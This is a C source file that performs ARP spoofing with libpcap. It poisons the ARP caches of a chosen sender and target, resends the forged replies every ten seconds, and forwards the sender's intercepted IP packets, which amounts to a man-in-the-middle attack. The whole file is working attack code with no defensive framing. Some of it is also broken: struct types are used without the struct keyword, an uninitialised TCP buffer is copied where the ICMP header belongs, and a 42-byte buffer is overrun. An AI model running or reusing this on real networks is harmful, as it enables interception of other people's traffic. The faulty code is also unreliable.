#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <stdint.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <linux/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <pthread.h>
#include <time.h>
#include <unistd.h>
#define ETHERNET_SIZE 14
#define CALC_LEN(Header_TCP) ((Header_TCP->OffsetNreserved & 0xf0) >> 4)
#pragma pack(1)
struct ETHERNET_HEADER{
    u_int8_t Destination_Mac[6];
    u_int8_t Source_Mac[6];
    u_int16_t Ether_Type;
};

struct ARP_HEADER{

    u_int16_t Mac_Type;
    u_int16_t IP_Type;
    u_int8_t Mac_Add_Len;
    u_int8_t IP_Add_Len;
    u_int16_t Opcode;
    u_int8_t Sender_Mac[6];
    struct in_addr Sender_IP;
    u_int8_t Target_Mac[6];
    struct in_addr Target_IP;
};
struct IP_HEADER{
    u_int8_t verNlen;
    u_int8_t TOS;
    u_int16_t Total_Len;
    u_int16_t Identification;
    u_int16_t Fragment;
    u_int8_t TTL;
    u_int8_t Protocol;
    u_int16_t Checksum;
    struct in_addr Destination_IP, Source_IP;
};
struct TCP_HEADER{
    u_int16_t Source_Port;
    u_int16_t Destination_Port;
    u_int32_t Sequence;
    u_int32_t Acknow_Number;
    u_int8_t OffsetNreserved;
    u_int8_t TCPFlags;
    u_int16_t SizeofWindow;
    u_int16_t Checksum;
    u_int16_t UrgentPorinter;
};
struct ICMP_HEADER{
    u_int8_t Type;
    u_int8_t Code;
    u_int16_t Checksum;
};

struct Attack_packet{

    pcap_t *handle;
    u_char *Arp_packet;
    struct in_addr attacker;
    struct in_addr sender;
    struct in_addr target;

    u_int8_t attacker_Mac[6];
    u_int8_t sender_Mac[6];
};

void *Send_Arp_packet(void *attack);
void *GetTarget_MacSniffing(void *attack);
int main(int argc, char *argv[]){

    char errbuf[PCAP_ERRBUF_SIZE];
    struct ETHERNET_HEADER *ethernet;
    struct ARP_HEADER *arp;
    struct ETHERNET_HEADER *temp_ethernet;
    struct ARP_HEADER *temp_arp;
    u_int32_t attacker;
    u_int32_t sender;
    int i = 0;
    struct pcap_pkthdr *header;
    const u_char* rev_packet;
    u_int32_t target;
    pcap_t *handle;
    u_char *Arp_packet;
    int res;
    pthread_t thr1, thr2;
    struct Attack_packet attack;
    ////////////////////////////////////
    ///////Variable For Getting Mac/////
    ////////////////////////////////////
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    ////////////////////////////////////
    //////Variable For Getting IP///////
    ////////////////////////////////////
    char ipstr[40];

    ////////////////////////////////////
    /////////Checking Argument//////////
    ////////////////////////////////////
    if(argc != 4 ){
        printf("%s [Interface] [Sender IP] [Target IP]\n",argv[0]);
        exit(1);
    }

    ethernet = (struct ETHERNET_HEADER*)malloc(sizeof(struct ETHERNET_HEADER));
    arp = (struct ARP_HEADER *)malloc(sizeof(struct ARP_HEADER));
    temp_ethernet = (struct ETHERNET_HEADER*)malloc(sizeof(struct ETHERNET_HEADER));
    temp_arp = (struct ARP_HEADER *)malloc(sizeof(struct ARP_HEADER));
    ////////////////////////////////////
    ///////Getting Mac Add//////////////
    ////////////////////////////////////
    strcpy(s.ifr_name, argv[1]);

    if( ioctl(fd, SIOCGIFHWADDR, &s) == 0){
        int i;
        for(i=0; i<6; i++){
            ethernet->Source_Mac[i] = s.ifr_addr.sa_data[i];
            arp->Sender_Mac[i] = s.ifr_addr.sa_data[i];
            attack.attacker_Mac[i] = s.ifr_addr.sa_data[i];
        }
    }
    ////////////////////////////////////
    ////////Getting IP Add//////////////
    ////////////////////////////////////

    if(ioctl(fd, SIOCGIFADDR, &s) < 0){
        perror("ioctl");
        exit(1);
    }
    inet_ntop(AF_INET, s.ifr_addr.sa_data+2, ipstr,sizeof(struct sockaddr));


    inet_pton(AF_INET, argv[2], &(sender));
    inet_pton(AF_INET, argv[3], &(target));
    inet_pton(AF_INET, ipstr, &(attacker));

    handle = pcap_open_live(argv[1], BUFSIZ, 0, -1, errbuf);

    //////////////////////////////////////////////
    //////Making Packet to know Victim's MAC//////
    //////////////////////////////////////////////

    for (i = 0; i < 6; i++) {
        ethernet->Destination_Mac[i] = 0xff;
    }
    ethernet->Ether_Type = 0x0608;

    arp->Mac_Type = 0x0100;
    arp->IP_Type = 0x0008;
    arp->Mac_Add_Len = 0x06;
    arp->IP_Add_Len = 0x04;
    arp->Opcode = 0x0100;
    ///////////////////////////////////////
    ////////Attacker Mac and IP////////////
    ///////////////////////////////////////

    arp->Sender_IP.s_addr = attacker;
    ////////////////////////////////////////
    //////////Victim Mac and IP/////////////
    ////////////////////////////////////////
    for(i=0; i<6; i++){
        arp->Target_Mac[i] = 0x00;
    }
    arp->Target_IP.s_addr = sender;

    Arp_packet = (u_int8_t *)malloc(sizeof(*ethernet)+sizeof(*arp));
    memcpy(Arp_packet,ethernet, sizeof(*ethernet));
    memcpy(Arp_packet+(sizeof(*ethernet)), arp, sizeof(*arp));
    ////////////////////////////////////////////////////////////
    /////////////////Sending Attack Arp_packet//////////////////
    ////////////////////////////////////////////////////////////
    pcap_sendpacket(handle, Arp_packet,42);
    while(1){
        res=pcap_next_ex(handle, &header, &rev_packet);

        if(res == 0){
            continue;
        }
        else if(res == -1 || res == -2){
            printf("res = -1 or -2 \n");
            break;
        }else{
            temp_ethernet = (struct ETHERNET_HEADER *)(rev_packet);
            temp_arp = (struct ARP_HEADER *)(rev_packet+ETHERNET_SIZE);
            if(temp_arp->Opcode == 512){
                printf("Found..!!\n");
                break;
            }


        }

    }

    for(i=0; i<6; i++){
        ethernet->Destination_Mac[i] = temp_ethernet->Source_Mac[i];
        arp->Target_Mac[i] = temp_ethernet->Source_Mac[i];
        attack.sender_Mac[i] = temp_ethernet->Source_Mac[i];
    }
    arp->Sender_IP.s_addr = target;
    arp->Opcode = 0x0200;

    memcpy(Arp_packet,ethernet, sizeof(*ethernet));
    memcpy(Arp_packet+(sizeof(*ethernet)), arp, sizeof(*arp));

    ////////////////////////////////////////////////////////////
    ////////////Sending Infected Packet Thread//////////////////
    ////////////////////////////////////////////////////////////
    attack.handle = handle;
    attack.Arp_packet = Arp_packet;
    attack.attacker.s_addr = attacker;
    attack.sender.s_addr = sender;
    attack.target.s_addr = target;

    pthread_create(&thr1, NULL, Send_Arp_packet, (void*)&attack);
    pthread_create(&thr2, NULL, GetTarget_MacSniffing, (void*)&attack);
    pthread_join(thr1, NULL);
    pthread_join(thr2, NULL);
    return 0;
}

void *Send_Arp_packet(void *attack)
{
    Attack_packet *attack_packet = (Attack_packet *)attack;
    pcap_t *handle = attack_packet->handle;
    u_char *Arp_packet = attack_packet->Arp_packet;
    while(1){
        pcap_sendpacket(handle, Arp_packet,42);
        printf("Infection Finished..!\n");
        sleep(10);
    }
    return NULL;

}
void *GetTarget_MacSniffing(void *attack){
    Attack_packet *attack_packet = (Attack_packet *)attack;
    pcap_t *handle = attack_packet->handle;
    int res, i, check;
    struct pcap_pkthdr *header;
    const u_char* rev_packet;
    u_char* packet_target;
    struct ETHERNET_HEADER *ethernet, *temp_ethernet;
    struct ARP_HEADER *arp, *temp_arp;
    struct IP_HEADER *ip;
    struct TCP_HEADER *tcp;
    struct ICMP_HEADER *icmp;
    char *data;
    int size_ip, size_tcp, size_icmp;
    int total_len_ip;
    int total_len_tcp;
    int total_len_icmp;
    u_int8_t Target_Mac[6];

    ethernet = (struct ETHERNET_HEADER*)malloc(sizeof(struct ETHERNET_HEADER));
    arp = (struct ARP_HEADER *)malloc(sizeof(struct ARP_HEADER));
    ip = (struct IP_HEADER *)malloc(sizeof(struct IP_HEADER));
    tcp = (struct TCP_HEADER *)malloc(sizeof(struct TCP_HEADER));
    icmp = (struct ICMP_HEADER *)malloc(sizeof(struct ICMP_HEADER));

    temp_ethernet = (struct ETHERNET_HEADER*)malloc(sizeof(struct ETHERNET_HEADER));
    temp_arp = (struct ARP_HEADER *)malloc(sizeof(struct ARP_HEADER));
    ////////////////////////////////////////////////////////////
    /////////////////Getting Target's Mac Add///////////////////
    ////////////////////////////////////////////////////////////
    for(i=0; i<6; i++){
        ethernet->Destination_Mac[i] = 0xff;
        ethernet->Source_Mac[i] = attack_packet->attacker_Mac[i];
        arp->Sender_Mac[i] = attack_packet->attacker_Mac[i];
        arp->Target_Mac[i] = 0x00;
    }

    ethernet->Ether_Type = 0x0608;
    arp->Mac_Type = 0x0100;
    arp->IP_Type = 0x0008;
    arp->Mac_Add_Len = 0x06;
    arp->IP_Add_Len = 0x04;
    arp->Opcode = 0x0100;
    arp->Sender_IP = attack_packet->attacker;
    arp->Target_IP = attack_packet->target;

    packet_target = (u_int8_t *)malloc(sizeof(*ethernet)+sizeof(*arp));
    memcpy(packet_target,ethernet, sizeof(*ethernet));
    memcpy(packet_target+(sizeof(*ethernet)), arp, sizeof(*arp));



    pcap_sendpacket(handle, packet_target, sizeof(*ethernet)+sizeof(*arp));

    while(1){
        res=pcap_next_ex(handle, &header, &rev_packet);
        if(res == 0){
            continue;
        }
        else if(res == -1 || res == -2){
            printf("res = -1 or -2 \n");
            break;
        }else{
            temp_ethernet = (struct ETHERNET_HEADER *)(rev_packet);
            temp_arp = (struct ARP_HEADER *)(rev_packet+ETHERNET_SIZE);
            if(temp_arp->Opcode == 512){
                for(i=0; i<6; i++){
                    Target_Mac[i] = temp_ethernet->Source_Mac[i];
                }
                printf("Found Target's Mac add..!!\n");
                break;
            }
        }

    }
    ////////////////////////////////////////////////////////////
    /////////////////Catching Sender's Packet///////////////////
    ////////////////////////////////////////////////////////////
    printf("Catching Sender's packer\n");
    while(1){
        res=pcap_next_ex(handle, &header, &rev_packet);
        if(res == 0){
            continue;
        }
        else if(res == -1 || res == -2){
            printf("res = -1 or -2 \n");
            break;
        }else{
            ethernet = (struct ETHERNET_HEADER *)(rev_packet);
            printf("Compare Ether_Type!!\n");

            printf("%02x\n", ethernet->Ether_Type);
            if(htons(ethernet->Ether_Type) != ETHERTYPE_IP){
                printf("This packet is not ip packet!!\n");
                continue;
            }else{
                printf("Compare Sender's Mac add\n");
                for(i=0; i<6; i++){
                    check = 0;
                    if(ethernet->Source_Mac[i] != attack_packet ->sender_Mac[i]){
                        check = 1;
                        break;
                    }
                }
                if(check == 0){
                    printf("Start Make Packet\n");
                    for(i=0; i<6; i++){
                        ethernet->Source_Mac[i] = attack_packet->attacker_Mac[i];
                        ethernet->Destination_Mac[i] = Target_Mac[i];
                    }
                    ip = (struct IP_HEADER *)(rev_packet+ETHERNET_SIZE);
                    size_ip = (ip->verNlen & 0xf)*4;
                    total_len_ip = ETHERNET_SIZE + size_ip;
                    icmp = (struct ICMP_HEADER *)(rev_packet+total_len_ip);
                    icmp->Checksum = icmp->Checksum + 0x08;
                    size_icmp = 2;
                    total_len_icmp = total_len_ip + size_icmp;
                    data = (char *)(rev_packet+total_len_icmp);

                    memcpy(packet_target, ethernet, sizeof(*ethernet));
                    memcpy(packet_target+ETHERNET_SIZE, ip, size_ip);
                    memcpy(packet_target+total_len_ip, tcp, size_icmp);
                    memcpy(packet_target+total_len_icmp, data, ntohs(ip->Total_Len)+ETHERNET_SIZE-total_len_icmp);

                    printf("please : %d\n",pcap_sendpacket(handle, packet_target, ntohs(ip->Total_Len)+ETHERNET_SIZE));
                    printf("please : %d\n",pcap_sendpacket(handle, packet_target, ntohs(ip->Total_Len)+ETHERNET_SIZE));
                    printf("Attack Finished..!\n");
                }
            }
        }
    }
    return NULL;
}

